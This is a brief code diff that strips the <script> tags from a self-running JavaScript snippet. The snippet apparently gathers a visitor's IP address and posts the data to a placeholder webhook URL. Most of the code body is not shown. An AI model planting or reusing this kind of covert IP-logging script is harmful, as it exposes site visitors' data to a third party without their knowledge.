@@ -1,4 +1,3 @@
-<script>
 (async function() {
     const webhookURL = "YOUR_WEBHOOK_URL";
     async function getIP() {
@@ -50,4 +49,3 @@
         body: JSON.stringify(data),
     }).catch(console.error);
 })();
-</script>
